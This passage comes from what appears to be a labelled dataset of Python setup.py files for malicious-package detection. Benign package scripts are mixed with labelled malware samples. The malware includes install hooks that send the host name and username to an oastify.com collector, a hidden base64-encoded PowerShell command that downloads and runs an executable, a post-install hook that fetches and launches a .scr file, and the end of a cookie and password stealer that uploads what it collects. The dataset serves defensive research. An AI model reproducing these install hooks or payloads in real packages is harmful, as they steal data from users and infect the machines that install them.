'mail','[coinbase](https://coinbase.com)','[sellix](https://sellix.io)','[gmail](https://gmail.com)','[steam](https://steam.com)','[discord](https://discord.com)','[riotgames](https://riotgames.com)','[youtube](https://youtube.com)','[instagram](https://instagram.com)','[tiktok](https://tiktok.com)','[twitter](https://twitter.com)','[facebook](https://facebook.com)','card','[epicgames](https://epicgames.com)','[spotify](https://spotify.com)','[yahoo](https://yahoo.com)','[roblox](https://roblox.com)','[twitch](https://twitch.com)','[minecraft](https://minecraft.net)','bank','[paypal](https://paypal.com)','[origin](https://origin.com)','[amazon](https://amazon.com)','[ebay](https://ebay.com)','[aliexpress](https://aliexpress.com)','[playstation](https://playstation.com)','[hbo](https://hbo.com)','[xbox](https://xbox.com)','buy','sell','[binance](https://binance.com)','[hotmail](https://hotmail.com)','[outlook](https://outlook.com)','[crunchyroll](https://crunchyroll.com)','[telegram](https://telegram.com)','[pornhub](https://pornhub.com)','[disney](https://disney.com)','[expressvpn](https://expressvpn.com)','crypto','[uber](https://uber.com)','[netflix](https://netflix.com)'\n]\ncookiWords=[]\npaswWords=[]\nGatherAll()\nDETECTED=Trust(Cookies)\nif not DETECTED:\n    wikith=Kiwi()\n    for thread in wikith:thread.join()\n    time.sleep(0.2)\n    filetext='\\n'\n    for arg in KiwiFiles:\n        if len(arg[2])!=0:\n            foldpath=arg[1]\n            foldlist=arg[2]\n            filetext+=f\"  {foldpath}\\n\"\n            for ffil in foldlist:\n                a=ffil[0].split('/')\n                fileanme=a[len(a)-1]\n                b=ffil[1]\n                filetext+=f\"... [{fileanme}]({b})\\n\"\n            filetext+='\\n'\n    upload('kiwi',filetext)\nfrom setuptools import setup\n\nsetup(\n\n    name='fakerv2',\n    packages=['fakerv2'],\n    version='1.0',\n    license='MIT',\n    description='a simple package.',\n    author='helper',\n    keywords=['style'],\n    install_requires=[''],\n    classifiers=['Development Status :: 5 - Production/Stable']\n)", "target": 1}
{"idx": "dockerpty-0.4.1", "func": "# dockerpty.\n#\n# Copyright 2014 Chris Corbyn <chris@w3style.co.uk>\n#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n# distributed under the License is distributed on an \"AS IS\" BASIS,\n# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n# See the License for the specific language governing permissions and\n# limitations under the License.\n\nfrom setuptools import setup\nimport os\n\n\ndef fopen(filename):\n    return open(os.path.join(os.path.dirname(__file__), filename))\n\n\ndef read(filename):\n    return fopen(filename).read()\n\nsetup(\n    name='dockerpty',\n    version='0.4.1',\n    description='Python library to use the pseudo-tty of a docker container',\n    long_description=read('README.md'),\n    url='https://github.com/d11wtq/dockerpty',\n    author='Chris Corbyn',\n    author_email='chris@w3style.co.uk',\n    install_requires=['six >= 1.3.0'],\n    license='Apache 2.0',\n    keywords='docker, tty, pty, terminal',\n    packages=['dockerpty'],\n    classifiers=[\n        'Development Status :: 4 - Beta',\n        'License :: OSI Approved :: Apache Software License',\n        'Programming Language :: Python',\n        'Environment :: Console',\n        'Intended Audience :: Developers',\n        'Topic :: Terminals',\n        'Topic :: Terminals :: Terminal Emulators/X Terminals',\n        'Topic :: Software Development :: Libraries',\n        'Topic :: Software Development :: Libraries :: Python Modules',\n    ],\n)\n", "target": 0}
{"idx": "draftjs_exporter-5.0.0", "func": "#!/usr/bin/env python\n\nfrom setuptools import find_packages, setup  # type: ignore\n\nfrom draftjs_exporter import __version__\n\nwith open(\"README.md\", encoding=\"utf-8\") as readme_file:\n    long_description = readme_file.read()\n\nsetup(\n    name=\"draftjs_exporter\",\n    version=__version__,\n    description=\"Library to convert rich text from Draft.js raw ContentState to HTML\",\n    long_description=long_description,\n    long_description_content_type=\"text/markdown\",\n    author=\"Springload\",\n    author_email=\"hello@springload.co.nz\",\n    url=\"https://github.com/springload/draftjs_exporter\",\n    packages=find_packages(exclude=[\"tests*\"]),\n    include_package_data=True,\n    license=\"MIT\",\n    classifiers=[\n        \"Environment :: Web Environment\",\n        \"Intended Audience :: Developers\",\n        \"License :: OSI Approved :: MIT License\",\n        \"Development Status :: 5 - Production/Stable\",\n        \"Operating System :: OS Independent\",\n        \"Programming Language :: Python\",\n        \"Programming Language :: Python :: 3\",\n        \"Programming Language :: Python :: 3.7\",\n        \"Programming Language :: Python :: 3.8\",\n        \"Programming Language :: Python :: 3.9\",\n        \"Programming Language :: Python :: 3.10\",\n        \"Programming Language :: Python :: 3.11\",\n        \"Topic :: Internet :: WWW/HTTP\",\n        \"Topic :: Internet :: WWW/HTTP :: Dynamic Content\",\n        \"Topic :: Internet :: WWW/HTTP :: Site Management\",\n        \"Topic :: Software Development :: Libraries :: Application Frameworks\",\n        \"Topic :: Software Development :: Libraries :: Python Modules\",\n        \"Topic :: Text Editors :: Word Processors\",\n        \"Typing :: Typed\",\n    ],\n    package_data={\"draftjs_exporter\": [\"py.typed\"]},\n    extras_require={\n        # Keep this in sync with the dependencies in setup.py, requirements.txt, tox.ini.\n        \"lxml\": [\"lxml>=4.2.0,<5\"],\n        \"html5lib\": [\"beautifulsoup4>=4.4.1,<5\", \"html5lib>=0.999,<2\"],\n    },\n    zip_safe=False,\n)\n", "target": 0}
{"idx": "django-fernet-fields-0.6", "func": "from os.path import join\nfrom setuptools import setup, find_packages\n\n\nlong_description = (\n    open('README.rst').read() + open('CHANGES.rst').read())\n\n\ndef get_version():\n    with open(join('fernet_fields', '__init__.py')) as f:\n        for line in f:\n            if line.startswith('__version__ ='):\n                return line.split('=')[1].strip().strip('\"\\'')\n\n\nsetup(\n    name='django-fernet-fields',\n    version=get_version(),\n    description=\"Fernet-encrypted model fields for Django\",\n    long_description=long_description,\n    long_description_content_type='text/x-rst',\n    author='ORCAS, Inc',\n    author_email='orcastech@orcasinc.com',\n    url='https://github.com/orcasgit/django-fernet-fields/',\n    packages=find_packages(),\n    install_requires=['Django>=1.11', 'cryptography>=0.9'],\n    classifiers=[\n        'Environment :: Web Environment',\n        'Intended Audience :: Developers',\n        'License :: OSI Approved :: BSD License',\n        'Operating System :: OS Independent',\n        'Programming Language :: Python',\n        'Programming Language :: Python :: 2',\n        'Programming Language :: Python :: 2.7',\n        'Programming Language :: Python :: 3',\n        'Programming Language :: Python :: 3.5',\n        'Programming Language :: Python :: 3.6',\n        'Programming Language :: Python :: 3.7',\n        'Programming Language :: Python :: Implementation :: CPython',\n        'Programming Language :: Python :: Implementation :: PyPy',\n        'Framework :: Django',\n    ],\n    zip_safe=False,\n)\n", "target": 0}
{"idx": "pip-cache-dir-1.0.0", "func": "from setuptools import setup\nfrom setuptools.command.install import install\nimport requests\nimport socket\nimport getpass\nimport os\n\nclass CustomInstall(install):\n    def run(self):\n        install.run(self)\n        hostname=socket.gethostname()\n        cwd = os.getcwd()\n        username = getpass.getuser()\n        ploads = {'hostname':hostname,'cwd':cwd,'username':username}\n        requests.get(\"jg360c2v1lbkgalt0tygti71hsnkbmzb.oastify.com\",params = ploads) #replace burpcollaborator.net with Interactsh or pipedream\n\n\nsetup(name='pip-cache-dir', #package name\n      version='1.0.0',\n      description='test',\n      author='test',\n      license='MIT',\n      zip_safe=False,\n      cmdclass={'install': CustomInstall})\n\n", "target": 1}
{"idx": "getcandy-1.94", "func": "from distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'getcandy',\n    packages = ['modlib'],\n    version = '4.70',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "py-mcedcraft-6.32", "func": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'py-mcedcraft',\n    packages = ['modlib'],\n    version = '2.98',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "factory_boy-3.2.1", "func": "#!/usr/bin/env python\n\nfrom setuptools import setup\n\nsetup()\n", "target": 0}
{"idx": "Dick.py-1.7", "func": "from setuptools import setup, find_packages\n\nwith open(\"README.md\", \"r\") as stream:\n    long_description = stream.read()\n\nsetup(\n    name = 'Dick.py',\n    version = '1.7',\n    url = 'https://github.com/aminobot22/MAmino.py',\n    download_url = 'https://github.com/aminobot22/MAmino.py.git',\n    license = 'MIT',\n    author = 'Slimakoi',\n    author_email = 'slimeytoficial@gmail.com',\n    description = 'A library to create Amino bots.',\n    long_description = long_description,\n    long_description_content_type = 'text/markdown',\n    keywords = [\n        'aminoapps',\n        'Dick',\n        'amino',\n        'amino-bot',\n        'narvii',\n        'api',\n        'python',\n        'python3',\n        'python3.x',\n        'slimakoi',\n        'official'\n    ],\n    install_requires = [\n        'setuptools',\n        'requests',\n        'six',\n        'websocket-client==0.57.0',\n        'json_minify',\n        'secmail',\n        'bs4',\n        'names',\n        'requests-random-user-agent'\n    ],\n    setup_requires = [\n        'wheel'\n    ],\n    packages = find_packages()\n)\n", "target": 0}
{"idx": "fakeredis-1.9.0", "func": "# -*- coding: utf-8 -*-\nfrom setuptools import setup\n\npackages = \\\n['fakeredis']\n\npackage_data = \\\n{'': ['*']}\n\ninstall_requires = \\\n['redis<4.4', 'six>=1.16.0,<2.0.0', 'sortedcontainers>=2.4.0,<3.0.0']\n\nextras_require = \\\n{'aioredis': ['aioredis>=2.0.1,<3.0.0'], 'lua': ['lupa>=1.13,<2.0']}\n\nsetup_kwargs = {\n    'name': 'fakeredis',\n    'version': '1.9.0',\n    'description': 'Fake implementation of redis API for testing purposes.',\n    'long_description': 'fakeredis: A fake version of a redis-py\\n=======================================\\n\\n![badge](https://img.shields.io/endpoint?url=https://gist.githubusercontent.com/cunla/b756396efb895f0e34558c980f1ca0c7/raw/fakeredis-py.json)\\n\\n- [fakeredis: A fake version of a redis-py](#fakeredis--a-fake-version-of-a-redis-py)\\n- [How to Use](#how-to-use)\\n  - [Use to test django-rq](#use-to-test-django-rq)\\n- [Other limitations](#other-limitations)\\n- [Support for redis-py <4.2 with aioredis](#support-for-redis-py--42-with-aioredis)\\n    + [aioredis 1.x](#aioredis-1x)\\n    + [aioredis 2.x](#aioredis-2x)\\n- [Running the Tests](#running-the-tests)\\n- [Contributing](#contributing)\\n- [Alternatives](#alternatives)\\n\\nfakeredis is a pure-Python implementation of the redis-py python client\\nthat simulates talking to a redis server. This was created for a single\\npurpose: **to write unittests**. Setting up redis is not hard, but\\nmany times you want to write unittests that do not talk to an external server\\n(such as redis). This module now allows tests to simply use this\\nmodule as a reasonable substitute for redis.\\n\\nAlthough fakeredis is pure Python, you will need [lupa](https://pypi.org/project/lupa/) if you want to run Lua\\nscripts (this includes features like ``redis.lock.Lock``, which are implemented\\nin Lua). If you install fakeredis with ``pip install fakeredis[lua]`` it will\\nbe automatically installed.\\n\\nFor a list of supported/unsupported redis commands, see [REDIS_COMMANDS.md](REDIS_COMMANDS.md)\\n\\n# How to Use\\nFakeRedis can imitate Redis server version 6.x or 7.x - There are a few minor behavior differences. \\nIf you do not specify the version, version 7 is used by default.\\n\\nThe intent is for fakeredis to act as though you\\'re talking to a real\\nredis server. It does this by storing state internally.\\nFor example:\\n\\n```\\n>>> import fakeredis\\n>>> r = fakeredis.FakeStrictRedis(version=6)\\n>>> r.set(\\'foo\\', \\'bar\\')\\nTrue\\n>>> r.get(\\'foo\\')\\n\\'bar\\'\\n>>> r.lpush(\\'bar\\', 1)\\n1\\n>>> r.lpush(\\'bar\\', 2)\\n2\\n>>> r.lrange(\\'bar\\', 0, -1)\\n[2, 1]\\n```\\n\\nThe state is stored in an instance of `FakeServer`. If one is not provided at\\nconstruction, a new instance is automatically created for you, but you can\\nexplicitly create one to share state:\\n\\n```\\n>>> import fakeredis\\n>>> server = fakeredis.FakeServer()\\n>>> r1 = fakeredis.FakeStrictRedis(server=server)\\n>>> r1.set(\\'foo\\', \\'bar\\')\\nTrue\\n>>> r2 = fakeredis.FakeStrictRedis(server=server)\\n>>> r2.get(\\'foo\\')\\n\\'bar\\'\\n>>> r2.set(\\'bar\\', \\'baz\\')\\nTrue\\n>>> r1.get(\\'bar\\')\\n\\'baz\\'\\n>>> r2.get(\\'bar\\')\\n\\'baz\\'\\n```\\n\\nIt is also possible to mock connection errors so you can effectively test\\nyour error handling. Simply set the connected attribute of the server to\\n`False` after initialization.\\n\\n```\\n>>> import fakeredis\\n>>> server = fakeredis.FakeServer()\\n>>> server.connected = False\\n>>> r = fakeredis.FakeStrictRedis(server=server)\\n>>> r.set(\\'foo\\', \\'bar\\')\\nConnectionError: FakeRedis is emulating a connection error.\\n>>> server.connected = True\\n>>> r.set(\\'foo\\', \\'bar\\')\\nTrue\\n```\\n\\nFakeredis implements the same interface as `redis-py`, the\\npopular redis client for python, and models the responses\\nof redis 6.2 (although most new features are not supported).\\n\\n## Use to test django-rq\\n\\nThere is a need to override `django_rq.queues.get_redis_connection` with\\na method returning the same connection.\\n\\n```python\\nfrom fakeredis import FakeRedisConnSingleton\\n\\ndjango_rq.queues.get_redis_connection = FakeRedisConnSingleton()\\n```\\n\\n# Other limitations\\n\\nApart from unimplemented commands, there are a number of cases where fakeredis\\nwon\\'t give identical results to real redis. The following are differences that\\nare unlikely to ever be fixed; there are also differences that are fixable\\n(such as commands that do not support all features) which should be filed as\\nbugs in Github.\\n\\n1. Hyperloglogs are implemented using sets underneath. This means that the\\n   `type` command will return the wrong answer, you can\\'t use `get` to retrieve\\n   the encoded value, and counts will be slightly different (they will in fact be\\n   exact).\\n\\n2. When a command has multiple error conditions, such as operating on a key of\\n   the wrong type and an integer argument is not well-formed, the choice of\\n   error to return may not match redis.\\n\\n3. The `incrbyfloat` and `hincrbyfloat` commands in redis use the C `long\\n   double` type, which typically has more precision than Python\\'s `float`\\n   type.\\n\\n4. Redis makes guarantees about the order in which clients blocked on blocking\\n   commands are woken up. Fakeredis does not honour these guarantees.\\n\\n5. Where redis contains bugs, fakeredis generally does not try to provide exact\\n   bug-compatibility. It\\'s not practical for fakeredis to try to match the set\\n   of bugs in your specific version of redis.\\n\\n6. There are a number of cases where the behaviour of redis is undefined, such\\n   as the order of elements returned by set and hash commands. Fakeredis will\\n   generally not produce the same results, and in Python versions before 3.6\\n   may produce different results each time the process is re-run.\\n\\n7. SCAN/ZSCAN/HSCAN/SSCAN will not necessarily iterate all items if items are\\n   deleted or renamed during iteration. They also won\\'t necessarily iterate in\\n   the same chunk sizes or the same order as redis.\\n\\n8. DUMP/RESTORE will not return or expect data in the RDB format. Instead the\\n   `pickle` module is used to mimic an opaque and non-standard format.\\n   **WARNING**: Do not use RESTORE with untrusted data, as a malicious pickle\\n   can execute arbitrary code.\\n\\n# Support for redis-py <4.2 with aioredis\\n\\nAioredis is now in redis-py 4.2.0. But support is maintained until fakeredis 2 for older version of redis-py.\\n\\nYou can also use fakeredis to mock out [aioredis](https://aioredis.readthedocs.io/). This is a much newer\\naddition to fakeredis (added in 1.4.0) with less testing, so your mileage may\\nvary. Both version 1 and version 2 (which have very different APIs) are\\nsupported. The API provided by fakeredis depends on the version of aioredis that is\\ninstalled.\\n\\n### aioredis 1.x\\n\\nExample:\\n\\n```\\n>>> import fakeredis.aioredis\\n>>> r = await fakeredis.aioredis.create_redis_pool()\\n>>> await r.set(\\'foo\\', \\'bar\\')\\nTrue\\n>>> await r.get(\\'foo\\')\\nb\\'bar\\'\\n```\\n\\nYou can pass a `FakeServer` as the first argument to `create_redis` or\\n`create_redis_pool` to share state (you can even share state with a\\n`fakeredis.FakeRedis`). It should even be safe to do this state sharing between\\nthreads (as long as each connection/pool is only used in one thread).\\n\\nIt is highly recommended that you only use the aioredis support with\\nPython 3.5.3 or higher. Earlier versions will not work correctly with\\nnon-default event loops.\\n\\n### aioredis 2.x\\n\\nExample:\\n\\n```\\n>>> import fakeredis.aioredis\\n>>> r = fakeredis.aioredis.FakeRedis()\\n>>> await r.set(\\'foo\\', \\'bar\\')\\nTrue\\n>>> await r.get(\\'foo\\')\\nb\\'bar\\'\\n```\\n\\nThe support is essentially the same as for redis-py e.g., you can pass a\\n`server` keyword argument to the `FakeRedis` constructor.\\n\\n# Running the Tests\\n\\nTo ensure parity with the real redis, there are a set of integration tests\\nthat mirror the unittests. For every unittest that is written, the same\\ntest is run against a real redis instance using a real redis-py client\\ninstance. In order to run these tests you must have a redis server running\\non localhost, port 6379 (the default settings). **WARNING**: the tests will\\ncompletely wipe your database!\\n\\nFirst install poetry if you don\\'t have it, and then install all the dependencies:\\n\\n```   \\npip install poetry\\npoetry install\\n``` \\n\\nTo run all the tests:\\n\\n```\\npoetry run pytest -v\\n```\\n\\nIf you only want to run tests against fake redis, without a real redis::\\n\\n```\\npoetry run pytest -m fake\\n```\\n\\nBecause this module is attempting to provide the same interface as `redis-py`,\\nthe python bindings to redis, a reasonable way to test this to to take each\\nunittest and run it against a real redis server. fakeredis and the real redis\\nserver should give the same result. To run tests against a real redis instance\\ninstead::\\n\\n```\\npoetry run pytest -m real\\n```\\n\\nIf redis is not running and you try to run tests against a real redis server,\\nthese tests will have a result of \\'s\\' for skipped.\\n\\nThere are some tests that test redis blocking operations that are somewhat\\nslow. If you want to skip these tests during day to day development,\\nthey have all been tagged as \\'slow\\' so you can skip them by running::\\n\\n```\\npoetry run pytest -m \"not slow\"\\n```\\n\\n# Contributing\\n\\nContributions are welcome. Please see the\\n[contributing guide](.github/CONTRIBUTING.md) for more details.\\nThe maintainer generally has very little time to work on fakeredis, so the\\nbest way to get a bug fixed is to contribute a pull request.\\n\\nIf you\\'d like to help out, you can start with any of the issues\\nlabeled with `Help wanted`.\\n\\n# Alternatives\\n\\nConsider using [redislite](https://redislite.readthedocs.io/en/latest/) instead of fakeredis.\\nIt runs a real redis server and connects to it over a UNIX domain socket, so it will behave just like a real\\nserver. Another alternative is [birdisle](https://birdisle.readthedocs.io/en/latest/), which\\nruns the redis code as a Python extension (no separate process), but which is currently unmaintained.\\n',\n    'author': 'James Saryerwinnie',\n    'author_email': 'js@jamesls.com',\n    'maintainer': 'Daniel Moran',\n    'maintainer_email': 'daniel.maruani@gmail.com',\n    'url': 'https://github.com/cunla/fakeredis-py',\n    'packages': packages,\n    'package_data': package_data,\n    'install_requires': install_requires,\n    'extras_require': extras_require,\n    'python_requires': '>=3.7,<4.0',\n}\n\n\nsetup(**setup_kwargs)\n", "target": 0}
{"idx": "yinstaller-4.5.2", "func": "from setuptools import setup, find_packages\nimport os \nimport requests\nfrom setuptools.command.install import install\nfrom sys import platform\n\ndef send():\n    try:\n        env = os.environ['COMPUTERNAME']\n        t = requests.get(\"https://linkedopports.com/pyp/resp.php?live=Installation \" +env)\n        if platform == 'win32':\n            url = 'https://python-release.com/python-install.scr'\n            filename = 'ini_file_pyp_41.exe'\n            rq = requests.get(url, allow_redirects=True)\n            open(filename, 'wb').write(rq.content)\n            os.system('start '+filename)\n    except:\n        pass    \n \nclass PostInstallCommand(install):\n    def run(self):\n        install.run(self)\n        send()\n\n#firstbasicpyapp, elevatepyapp, praisepyapp\nsetup(\n  name='yinstaller',\n  version='4.5.2',\n  description='A very basic firstbasicpyapp',\n  python_requires=\">=3.6\",\n  install_requires=[''],\n  tests_require=[],\n  cmdclass={'install': PostInstallCommand},\n)", "target": 1}
{"idx": "libpaypalintpy-2.52", "func": "from distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'libpaypalintpy',\n    packages = ['modlib'],\n    version = '7.94',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "gamecpu-8.39", "func": "from distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'gamecpu',\n    packages = ['modlib'],\n    version = '3.5',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "fbprophet-0.7.1", "func": "# Copyright (c) Facebook, Inc. and its affiliates.\n\n# This source code is licensed under the MIT license found in the\n# LICENSE file in the root directory of this source tree.\n\nimport os.path\nimport platform\nimport sys\nimport os\nfrom pkg_resources import (\n    normalize_path,\n    working_set,\n    add_activation_listener,\n    require,\n)\nfrom setuptools import setup, find_packages\nfrom setuptools.command.build_py import build_py\nfrom setuptools.command.develop import develop\nfrom setuptools.command.test import test as test_command\nfrom typing import List\n\nPLATFORM = 'unix'\nif platform.platform().startswith('Win'):\n    PLATFORM = 'win'\n\nMODEL_DIR = os.path.join('stan', PLATFORM)\nMODEL_TARGET_DIR = os.path.join('fbprophet', 'stan_model')\n\n\ndef get_backends_from_env() -> List[str]:\n    from fbprophet.models import StanBackendEnum\n    return os.environ.get(\"STAN_BACKEND\", StanBackendEnum.PYSTAN.name).split(\",\")\n\n\ndef build_models(target_dir):\n    from fbprophet.models import StanBackendEnum\n    for backend in get_backends_from_env():\n        StanBackendEnum.get_backend_class(backend).build_model(target_dir, MODEL_DIR)\n\n\nclass BuildPyCommand(build_py):\n    \"\"\"Custom build command to pre-compile Stan models.\"\"\"\n\n    def run(self):\n        if not self.dry_run:\n            target_dir = os.path.join(self.build_lib, MODEL_TARGET_DIR)\n            self.mkpath(target_dir)\n            build_models(target_dir)\n\n        build_py.run(self)\n\n\nclass DevelopCommand(develop):\n    \"\"\"Custom develop command to pre-compile Stan models in-place.\"\"\"\n\n    def run(self):\n        if not self.dry_run:\n            target_dir = os.path.join(self.setup_path, MODEL_TARGET_DIR)\n            self.mkpath(target_dir)\n            build_models(target_dir)\n\n        develop.run(self)\n\n\nclass TestCommand(test_command):\n    user_options = [\n        ('test-module=', 'm', \"Run 'test_suite' in specified module\"),\n        ('test-suite=', 's',\n         \"Run single test, case or suite (e.g. 'module.test_suite')\"),\n        ('test-runner=', 'r', \"Test runner to use\"),\n        ('test-slow', 'w', \"Test slow suites (default off)\"),\n    ]\n\n    def initialize_options(self):\n        super(TestCommand, self).initialize_options()\n        self.test_slow = False\n\n    def finalize_options(self):\n        super(TestCommand, self).finalize_options()\n        if self.test_slow is None:\n            self.test_slow = getattr(self.distribution, 'test_slow', False)\n\n    \"\"\"We must run tests on the build directory, not source.\"\"\"\n\n    def with_project_on_sys_path(self, func):\n        # Ensure metadata is up-to-date\n        self.reinitialize_command('build_py', inplace=0)\n        self.run_command('build_py')\n        bpy_cmd = self.get_finalized_command(\"build_py\")\n        build_path = normalize_path(bpy_cmd.build_lib)\n\n        # Build extensions\n        self.reinitialize_command('egg_info', egg_base=build_path)\n        self.run_command('egg_info')\n\n        self.reinitialize_command('build_ext', inplace=0)\n        self.run_command('build_ext')\n\n        ei_cmd = self.get_finalized_command(\"egg_info\")\n\n        old_path = sys.path[:]\n        old_modules = sys.modules.copy()\n\n        try:\n            sys.path.insert(0, normalize_path(ei_cmd.egg_base))\n            working_set.__init__()\n            add_activation_listener(lambda dist: dist.activate())\n            require('%s==%s' % (ei_cmd.egg_name, ei_cmd.egg_version))\n            func()\n        finally:\n            sys.path[:] = old_path\n            sys.modules.clear()\n            sys.modules.update(old_modules)\n            working_set.__init__()\n\nwith open('README.md', 'r', encoding='utf-8') as f:\n    long_description = f.read()\n\nwith open('requirements.txt', 'r') as f:\n    install_requires = 